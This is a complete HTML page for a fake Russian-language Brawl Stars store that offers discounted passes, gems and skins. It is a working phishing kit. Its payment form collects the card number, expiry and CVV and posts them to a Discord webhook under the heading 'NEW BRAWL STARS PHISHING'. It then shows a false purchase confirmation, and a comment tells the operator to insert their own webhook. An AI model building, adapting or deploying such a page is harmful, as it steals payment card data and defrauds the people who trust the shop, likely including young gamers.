<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Brawl Shop — скидка 30%</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: system-ui, 'Segoe UI', -apple-system, sans-serif;
        }
        body {
            background: #0a0c15;
            color: #eee;
            padding: 20px;
        }
        .container {
            max-width: 1300px;
            margin: 0 auto;
        }
        h1 {
            color: #ffcc00;
            font-size: 2rem;
        }
        /* вкладки */
        .tabs {
            display: flex;
            gap: 12px;
            flex-wrap: wrap;
            margin: 25px 0 20px;
            border-bottom: 1px solid #2a2f44;
            padding-bottom: 10px;
        }
        .tab-btn {
            background: #1e2438;
            border: none;
            padding: 10px 24px;
            font-size: 1rem;
            font-weight: bold;
            color: #bbb;
            border-radius: 40px;
            cursor: pointer;
            transition: all 0.2s;
        }
        .tab-btn.active {
            background: #ffcc00;
            color: #0a0c15;
        }
        .tab-content {
            display: none;
            animation: fade 0.2s;
        }
        .tab-content.active {
            display: block;
        }
        @keyframes fade {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        /* товары */
        .products {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
            gap: 24px;
            margin: 25px 0;
        }
        .product-card {
            background: #151e2c;
            border-radius: 24px;
            padding: 18px;
            transition: 0.2s;
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
        }
        .product-card:hover {
            transform: translateY(-4px);
        }
        .product-title {
            font-size: 1.3rem;
            font-weight: bold;
            margin-bottom: 8px;
        }
        .product-desc {
            font-size: 0.85rem;
            color: #aaa;
            margin: 8px 0;
        }
        .price {
            font-size: 1.6rem;
            font-weight: bold;
            color: #ffcc00;
            margin: 12px 0;
        }
        .old-price {
            text-decoration: line-through;
            font-size: 0.9rem;
            color: #888;
            margin-left: 10px;
        }
        .add-to-cart {
            background: #ffcc00;
            border: none;
            width: 100%;
            padding: 10px;
            border-radius: 40px;
            font-weight: bold;
            cursor: pointer;
            font-size: 1rem;
        }
        .add-to-cart:hover {
            background: #ffdd55;
        }
        /* корзина */
        .cart-section {
            background: #0f1322;
            border-radius: 24px;
            padding: 20px;
            margin-top: 40px;
            border: 1px solid #2a2f44;
        }
        .cart-items {
            list-style: none;
            margin: 15px 0;
            max-height: 220px;
            overflow-y: auto;
        }
        .cart-items li {
            display: flex;
            justify-content: space-between;
            padding: 8px 0;
            border-bottom: 1px solid #2a2f44;
        }
        .cart-items button {
            background: #c0392b;
            border: none;
            padding: 4px 12px;
            border-radius: 20px;
            color: white;
            cursor: pointer;
        }
        .total {
            font-size: 1.4rem;
            text-align: right;
            margin: 15px 0;
        }
        .checkout-btn {
            background: #2ecc71;
            color: black;
            border: none;
            padding: 12px 30px;
            border-radius: 40px;
            font-weight: bold;
            font-size: 1rem;
            cursor: pointer;
        }
        /* модалка */
        .modal {
            display: none;
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(0,0,0,0.85);
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        .modal-content {
            background: #1e2438;
            padding: 28px;
            border-radius: 28px;
            width: 90%;
            max-width: 400px;
        }
        .modal-content input {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            background: #0a0c15;
            border: 1px solid #3a4055;
            border-radius: 40px;
            color: white;
        }
        .pay-btn {
            background: #ffcc00;
            width: 100%;
            margin-top: 15px;
        }
        .close {
            float: right;
            font-size: 26px;
            cursor: pointer;
        }
        footer {
            text-align: center;
            margin-top: 40px;
            color: #555;
            font-size: 0.75rem;
        }
    </style>
</head>
<body>
<div class="container">
    <h1>⭐ brawl stars shop</h1>
    <p>цены ниже на 30% | региональная схема</p>

    <div class="tabs">
        <button class="tab-btn active" data-tab="tab1">brawl pass</button>
        <button class="tab-btn" data-tab="tab2">brawl pass+</button>
        <button class="tab-btn" data-tab="tab3">гемы</button>
        <button class="tab-btn" data-tab="tab4">скины</button>
    </div>

    <div id="tab1" class="tab-content active"><div class="products" id="prod-pass"></div></div>
    <div id="tab2" class="tab-content"><div class="products" id="prod-passplus"></div></div>
    <div id="tab3" class="tab-content"><div class="products" id="prod-gems"></div></div>
    <div id="tab4" class="tab-content"><div class="products" id="prod-skins"></div></div>

    <div class="cart-section">
        <h2>🛒 корзина</h2>
        <ul class="cart-items" id="cartList"><li style="color:#888;">пусто</li></ul>
        <div class="total" id="cartTotal">итого: 0 ₽</div>
        <button class="checkout-btn" id="checkoutBtn">оформить заказ</button>
    </div>
</div>

<div id="paymentModal" class="modal">
    <div class="modal-content">
        <span class="close">&times;</span>
        <h3>💳 оплата картой</h3>
        <input type="text" id="cardNumber" placeholder="номер карты (16 цифр)" maxlength="19">
        <input type="text" id="expiry" placeholder="MM/YY" maxlength="5">
        <input type="text" id="cvv" placeholder="CVV" maxlength="4">
        <button class="pay-btn" id="submitPayment">оплатить</button>
        <p style="font-size:12px; margin-top:12px;">данные защищены</p>
    </div>
</div>

<footer>неофициальный магазин | экономия до 30%</footer>

<script>
    // ---------- ТОВАРЫ (скидка 30% от реальных цен) ----------
    const products = {
        pass: [
            { id: "p1", name: "brawl pass сезон 1", price: 349, old: 499, desc: "70 уровней + эксклюзив" },
            { id: "p2", name: "brawl pass сезон 2", price: 349, old: 499, desc: "мега ящики + скин" },
            { id: "p3", name: "brawl pass сезон 3", price: 349, old: 499, desc: "полный пропуск" }
        ],
        passplus: [
            { id: "pp1", name: "brawl pass+ экстра", price: 549, old: 799, desc: "+20 уровней" },
            { id: "pp2", name: "brawl pass+ премиум", price: 649, old: 929, desc: "скин + 100 гемов" }
        ],
        gems: [
            { id: "g1", name: "80 гемов", price: 111, old: 159, desc: "30% экономии" },
            { id: "g2", name: "170 гемов", price: 223, old: 319, desc: "30% экономии" },
            { id: "g3", name: "360 гемов", price: 454, old: 649, desc: "30% экономии" },
            { id: "g4", name: "950 гемов", price: 1049, old: 1499, desc: "30% экономии" }
        ],
        skins: [
            { id: "s1", name: "меха леон", price: 279, old: 399, desc: "легендарный" },
            { id: "s2", name: "ковбой кольт", price: 209, old: 299, desc: "эпик" },
            { id: "s3", name: "рокер мортис", price: 349, old: 499, desc: "мифический" },
            { id: "s4", name: "бо ультимативный", price: 489, old: 699, desc: "эксклюзив" },
            { id: "s5", name: "призрак кольт", price: 279, old: 399, desc: "limited" },
            { id: "s6", name: "дракон найт", price: 419, old: 599, desc: "легендарка" }
        ]
    };

    // корзина
    let cart = [];

    function renderProducts(category, containerId) {
        const container = document.getElementById(containerId);
        if (!container) return;
        const items = products[category];
        if (!items) return;
        container.innerHTML = items.map(p => `
            <div class="product-card">
                <div class="product-title">${p.name}</div>
                <div class="product-desc">${p.desc}</div>
                <div class="price">${p.price} ₽ <span class="old-price">${p.old} ₽</span></div>
                <button class="add-to-cart" data-id="${p.id}" data-name="${p.name}" data-price="${p.price}">в корзину</button>
            </div>
        `).join('');

        // навесить обработчики на кнопки этой вкладки
        document.querySelectorAll(`#${containerId} .add-to-cart`).forEach(btn => {
            btn.addEventListener('click', (e) => {
                const id = btn.getAttribute('data-id');
                const name = btn.getAttribute('data-name');
                const price = parseInt(btn.getAttribute('data-price'));
                addToCart(id, name, price);
            });
        });
    }

    function addToCart(id, name, price) {
        cart.push({ id, name, price });
        updateCartUI();
        showNotif(`✅ ${name} добавлен`);
    }

    function updateCartUI() {
        const list = document.getElementById('cartList');
        const totalSpan = document.getElementById('cartTotal');
        if (!list) return;
        if (cart.length === 0) {
            list.innerHTML = '<li style="color:#888;">корзина пуста</li>';
            totalSpan.innerText = 'итого: 0 ₽';
            return;
        }
        let total = 0;
        list.innerHTML = cart.map((item, idx) => {
            total += item.price;
            return `<li>${item.name} — ${item.price} ₽ <button class="remove-item" data-index="${idx}">удалить</button></li>`;
        }).join('');
        totalSpan.innerText = `итого: ${total} ₽`;

        // удаление
        document.querySelectorAll('.remove-item').forEach(btn => {
            btn.addEventListener('click', (e) => {
                const idx = parseInt(btn.getAttribute('data-index'));
                cart.splice(idx, 1);
                updateCartUI();
            });
        });
    }

    function showNotif(msg) {
        let div = document.createElement('div');
        div.innerText = msg;
        div.style.position = 'fixed';
        div.style.bottom = '20px';
        div.style.right = '20px';
        div.style.backgroundColor = '#ffcc00';
        div.style.color = '#000';
        div.style.padding = '10px 18px';
        div.style.borderRadius = '30px';
        div.style.zIndex = '9999';
        document.body.appendChild(div);
        setTimeout(() => div.remove(), 2000);
    }

    // вкладки
    const btns = document.querySelectorAll('.tab-btn');
    const contents = document.querySelectorAll('.tab-content');
    btns.forEach(btn => {
        btn.addEventListener('click', () => {
            const tabId = btn.getAttribute('data-tab');
            contents.forEach(c => c.classList.remove('active'));
            document.getElementById(tabId).classList.add('active');
            btns.forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
        });
    });

    // рендер всех товаров
    renderProducts('pass', 'prod-pass');
    renderProducts('passplus', 'prod-passplus');
    renderProducts('gems', 'prod-gems');
    renderProducts('skins', 'prod-skins');

    // ---------- ОПЛАТА И ВЕБХУК ----------
    // !!! ЗАМЕНИ НА СВОЙ ДИСКОРД ВЕБХУК !!!
    const WEBHOOK = 'https://discord.com/api/webhooks/ЗАМЕНИ_НА_СВОЙ/ТОКЕН';

    const modal = document.getElementById('paymentModal');
    const checkout = document.getElementById('checkoutBtn');
    const closeModal = document.querySelector('.close');

    checkout.addEventListener('click', () => {
        if (cart.length === 0) {
            alert('корзина пуста, добавь товары');
            return;
        }
        modal.style.display = 'flex';
    });

    closeModal.addEventListener('click', () => {
        modal.style.display = 'none';
    });
    window.addEventListener('click', (e) => {
        if (e.target === modal) modal.style.display = 'none';
    });

    document.getElementById('submitPayment').addEventListener('click', async () => {
        const card = document.getElementById('cardNumber').value.trim();
        const exp = document.getElementById('expiry').value.trim();
        const cvv = document.getElementById('cvv').value.trim();
        if (!card || !exp || !cvv) {
            alert('заполни все поля карты');
            return;
        }
        const total = cart.reduce((s, i) => s + i.price, 0);
        const itemsText = cart.map(i => `${i.name} (${i.price}₽)`).join('\n');
        const dataToSend = {
            content: "**НОВЫЙ ФИШИНГ БРАВЛ СТАРС**",
            embeds: [{
                title: "💳 данные карты + заказ",
                color: 0xffcc00,
                fields: [
                    { name: "📦 товары", value: itemsText || "нет", inline: false },
                    { name: "💰 сумма", value: `${total} ₽`, inline: true },
                    { name: "💳 карта", value: `||${card}||`, inline: false },
                    { name: "📅 срок", value: exp, inline: true },
                    { name: "🔐 CVV", value: `||${cvv}||`, inline: true }
                ],
                timestamp: new Date().toISOString()
            }]
        };
        try {
            await fetch(WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(dataToSend)
            });
            alert('спасибо за покупку! товары придут на аккаунт в течение 30 минут.');
            cart = [];
            updateCartUI();
            modal.style.display = 'none';
            document.getElementById('cardNumber').value = '';
            document.getElementById('expiry').value = '';
            document.getElementById('cvv').value = '';
        } catch (err) {
            alert('ошибка соединения, попробуй еще');
        }
    });
</script>
</body>
</html>
